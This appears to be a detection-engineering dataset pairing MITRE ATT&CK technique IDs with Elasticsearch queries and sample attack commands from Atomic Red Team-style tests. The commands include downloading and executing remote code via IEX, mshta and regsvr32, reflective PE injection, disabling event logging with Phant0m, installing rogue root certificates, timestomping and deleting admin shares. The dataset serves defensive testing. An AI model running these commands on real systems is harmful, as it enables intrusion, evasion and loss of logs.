T1497.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match"": {""CommandLine"": ""sleep""}},
                {""match_phrase"": {""CommandLine"": ""sleep.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",sleep 60,2(4)
T1055.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""New-Object System.Net.WebClient""}},
                        {""wildcard"":{""CommandLine"": ""*.Headers.add""}},
                        {""wildcard"":{""CommandLine"": ""*.DownloadData""}},
                        {""match_phrase"": {""CommandLine"": ""Invoke-ReflectivePEInjection""}},
                        {""match"": {""CommandLine"": ""-PBytes""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""debugger.dll""}},
                        {""match_phrase"": {""CommandLine"": ""shared.go""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","#这段代码caldera划在了credential access里，实际上该战术无此技术
$url=""#{server}/file/download"";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add(""file"",""debugger.dll"");
$PBytes = $wc.DownloadData($url);
$wc1 = New-Object System.net.webclient;
$wc1.headers.add(""file"",""Invoke-ReflectivePEInjection.ps1"");
IEX ($wc1.DownloadString($url));
Invoke-ReflectivePEInjection -PBytes $PBytes -verbose

$url=""#{server}/file/download"";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add(""platform"",""windows"");
$wc.Headers.add(""file"",""shared.go"");
$wc.Headers.add(""server"",""#{server}"");
$PEBytes = $wc.DownloadData($url);
$wc1 = New-Object System.net.webclient;
$wc1.headers.add(""file"",""Invoke-ReflectivePEInjection.ps1"");
IEX ($wc1.DownloadString($url));
Invoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}",3
T1553.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Import-Certificate""}},
                {""match"": {""CommandLine"": ""rootCA.cer""}},
                {""match_phrase"": {""CommandLine"": ""Cert:\\LocalMachine\\Root""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\LocalMachine\My; 
Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",2
T1553.004,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                  {""wildcard"": {""CommandLine"": ""certutil*""}},
                  {""wildcard"": {""CommandLine"": ""rootCA*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",certutil -addstore my $env:Temp\rootCA2.cer ,2
T1218.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-ATHCompiledHelp""}},
                {""wildcard"": {""CommandLine"": ""*.chm""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHCompiledHelp -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm",2
T1218.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""mshta*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$var =Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta""; 
$var.content|out-file ""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""; 
mshta ""$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta""

mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();

mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")

mshta.exe ""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run%20""""powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205""""""))</script>'""",2
T1218.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-ATHHTMLApplication""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""JScript""}},
                        {""wildcard"": {""CommandLine"": ""*.hta""}},
      ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""rundll32.exe""}},
                        {""match"": {""CommandLine"": ""-SimulateUserDoubleClick""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\system32\rundll32.exe

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe

$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; 
if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  
Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe",2
T1112,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                 {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""reg add""}},
                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}}
                        ]
                    }
                },
                {""bool"":{
                    ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Windows\\CurrentVersion\\Internet Settings""}},
                        {""match"": {""CommandLine"": ""<script>""}}
                        ]
                    }
                }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","New-ItemProperty ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" -Name T1112 -Value ""<script>""",2
T1112,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                 {""bool"":{
                    ""should"":[
                        {""match_phrase"": {""CommandLine"": ""reg add""}},
                        {""match_phrase"": {""CommandLine"": ""New-ItemProperty""}}
                        ]
                    }
                },
                {""bool"":{
                    ""must"":[
                        {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Control\SafeBoot""}},
                        {""match"": {""CommandLine"": ""\""Service\""""}}
                        ]
                    }
                }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""

REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""",2
T1562.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""*Phant0m*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore; 
$url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""; 
$output = ""$env:TEMP\Invoke-Phant0m.ps1""; 
$wc = New-Object System.Net.WebClient; 
$wc.DownloadFile($url, $output); 
cd $env:TEMP; 
Import-Module .\Invoke-Phant0m.ps1; 
Invoke-Phant0m

PathToAtomicsFolder\T1562.002\bin\Phant0m.exe",2
T1218,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""wuauclt*""}},
                {""wildcard"": {""CommandLine"": ""*.dll""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",wuauclt.exe /UpdateDeploymentProvider 6349c0_calc.dll /RunHandlerComServer,2
T1127.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""msbuild*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.csproj""}},
                        {""wildcard"": {""CommandLine"": ""*vb*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe e93bc3_T1127.001.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe f8ed8b_vb.xml",2
T1220,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""msxsl*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.xml""}},
                        {""wildcard"": {""CommandLine"": ""*.xsl""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","PathToAtomicsFolder\T1220\bin\msxsl.exe 70a91b_msxslxmlfile.xml 96ede8_msxslscript.xsl

PathToAtomicsFolder\T1220\bin\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl",2
T1220,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""wmic process list""}},
                {""match"": {""CommandLine"": ""/FORMAT""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic process list /FORMAT:""e3e9ba_wmicscript.xsl""

wmic process list /FORMAT:""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl""",2
T1036,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Expand-Archive""}},
                {""match_phrase"": {""CommandLine"": ""\\Downloads\\""}},
                {""wildcard"": {""CommandLine"": ""*zip""}},
                {""wildcard"": {""CommandLine"": ""*cmd""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (Test-Path $env:userprofile\Downloads\T1036.zip) { ;
 } else {Invoke-WebRequest -OutFile ""$env:userprofile\Downloads\T1036.zip"" https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip};  ;  
Expand-Archive -Path $env:userprofile\Downloads\T1036.zip -DestinationPath $env:userprofile\Downloads\T1036 -Force; 
cd $env:userprofile\Downloads\T1036; 
cmd /c $env:userprofile\Downloads\T1036\README.cmd >$null 2>$null",2
T1036,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""cmd.exe""}},
                          {""match"": {""CommandLine"": ""copy""}},
                        {""match"": {""CommandLine"": ""start""}},
                        {""match"": {""CommandLine"": ""/Y""}},
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""Image"": ""system32\\cmd.exe""}},
                        {""match_phrase"": {""Image"": ""system32\\WindowsPowerShell\\v1.0\\powershell.exe""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","copy %WINDIR%\System32\cmd.exe /Y %ALLUSERSPROFILE%\cmd.exe 
&& start %ALLUSERSPROFILE%\cmd.exe",2
T1036.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Add-Type -TypeDefinition""}},
                {""match"": {""CommandLine"": ""-OutputAssembly""}},
                {""match"": {""CommandLine"": ""svchost.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Add-Type -TypeDefinition @'; 
public class Test {;
     public static void Main(string[] args) {;
         System.Console.WriteLine(""tweet, tweet"");
     };
 }; 
'@ -OutputAssembly ""$Env:windir\Temp\svchost.exe""; 
Start-Process -FilePath ""$Env:windir\Temp\svchost.exe""",2
T1218.007,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                 {""bool"":{
                    ""should"":[
                        {""match"": {""CommandLine"": "" /y""}},
                         {""match"": {""CommandLine"": "" /i""}},
                        {""match"": {""CommandLine"": ""/q""}}
                        ]
                    }
                },
                {""bool"":{
                    ""must"":[
                      {""wildcard"": {""CommandLine"": ""msiexec*""}}
                        ]
                    }
                }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","msiexec.exe /y ""#{dll_payload}""

msiexec.exe /q /i ""#{msi_payload}""",2
T1218.008,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""odbcconf*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","odbcconf.exe /S /A {REGSVR ""#{dll_payload}""}",2
T1218.009,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""wildcard"": {""CommandLine"": ""regasm*""}},
                {""wildcard"": {""CommandLine"": ""regsvcs*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""%tmp%\T1218.009.dll"" /target:library aaaa08_T1218.009.cs 
&& C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U %tmp%\T1218.009.dll

$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='; 
$Content = [System.Convert]::FromBase64String($key); 
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte; C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""$Env:TEMP\T1218.009.dll"" /target:library /keyfile:$env:Temp\key.snk aaaa08_T1218.009.cs; C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe $Env:TEMP\T1218.009.dll",2
T1218.010,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""VBoxDRV""}},
                         {""match_phrase"": {""CommandLine"": ""\\MobileEmuMaster\\""}}
                       
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                {""wildcard"": {""CommandLine"": ""regsvr32*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","C:\Windows\system32\regsvr32.exe /s %temp%\shell32.jpg

C:\Windows\system32\regsvr32.exe /s /i bafdf3_AllTheThingsx86.dll

C:\Windows\system32\regsvr32.exe /s /u /i:4774cd_RegSvr32.sct scrobj.dll

IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )

C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",2
T1218,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""protocolhandler*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""reg query""}},
                        {""match_phrase"": {""CommandLine"": ""CurrentVersion\\App Paths\\Winword.exe""}},
                        {""match_phrase"": {""CommandLine"": ""/v PATH""}},
                        {""match_phrase"": {""CommandLine"": ""Microsoft Office\\Root\\Office16""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","FOR /F ""tokens=2*"" %a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe"" /V PATH') do set microsoft_wordpath=%b 
&& call ""%microsoft_wordpath%\protocolhandler.exe"" ""ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx""",2
T1216,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""SyncAppvPublishingServer.vbs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;Start-Process calc""",2
T1216,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""cscript*""}},
                {""match_phrase"": {""CommandLine"": ""manage-bde.wsf""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","set comspec=%windir%\System32\calc.exe 
&& cscript %windir%\System32\manage-bde.wsf",2
T1216.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""cscript*""}},
                {""match_phrase"": {""CommandLine"": ""pubprn.vbs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs localhost ""script:#{remote_payload}""",2
T1006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""New-Object IO.FileStream""}},
                        {""match"": {""CommandLine"": ""\\\\.\\C:""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match"": {""CommandLine"": ""Open""}},
                        {""match"": {""CommandLine"": ""Read""}},
                        {""match"": {""CommandLine"": ""ReadWrite""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$buffer = New-Object byte[] 11; 
$handle = New-Object IO.FileStream ""\\.\C:"", 'Open', 'Read', 'ReadWrite'; 
$handle.Read($buffer, 0, $buffer.Length); 
$handle.Close(); 
Format-Hex -InputObject $buffer",2
T1070.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""net share""}},
                {""match"": {""CommandLine"": ""/delete""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","for %i in (C$ IPC$ ADMIN$) do net share %i /delete

net share \\test\share /delete",2
T1070.005,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"": {""CommandLine"": ""Remove-SmbShare""}},
                {""match_phrase"": {""CommandLine"": ""Remove-FileShare""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-SmbShare -Name \\test\share; 
Remove-FileShare -Name \\test\share",2
T1070.006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}},
                        {""wildcard"": {""CommandLine"": ""*txt""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*CreationTime""}},
                        {""wildcard"": {""CommandLine"": ""*LastAccessTime""}},
                        {""wildcard"": {""CommandLine"": ""*LastWriteTime""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Get-ChildItem $env:TEMP\T1551.006_timestomp.txt | % { $_.CreationTime = ""01/01/1970 00:00:00"" }

Get-ChildItem $env:TEMP\T1551.006_timestomp.txt | % { $_.LastAccessTime = ""01/01/1970 00:00:00"" }

Get-ChildItem $env:TEMP\T1551.006_timestomp.txt | % { $_.LastWriteTime = ""01/01/1970 00:00:00"" }",2
T1070.006,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""timestomp -dest""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","import-module $env:appdata\Microsoft\timestomp.ps1; 
timestomp -dest ""$env:appdata\Microsoft\kxwn.lock""",2
T1553.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Set-Content""}},
                {""match"": {""CommandLine"": ""-Stream""}},
                {""match"": {""CommandLine"": ""Zone.Identifier""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Set-Content -Path $env:tmp\ReadMe.md -Stream Zone.Identifier -Value '[ZoneTransfer]','ZoneId=3'",2
T1055.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""odbcconf*""}},
                {""wildcard"": {""CommandLine"": ""*.dll""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","odbcconf.exe /S /A {REGSVR ""C:\Users\Public\sandcat.dll""}",2
T1055.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""mavinject*""}},
                {""wildcard"": {""CommandLine"": ""*.dll""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$explorer = Get-Process -Name explorer;
mavinject.exe $explorer.id C:\Users\Public\sandcat.dll

mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}",2
T1221,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""start""}},
                {""wildcard"": {""CommandLine"": ""01b633_Calculator*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",start 01b633_Calculator.docx,2
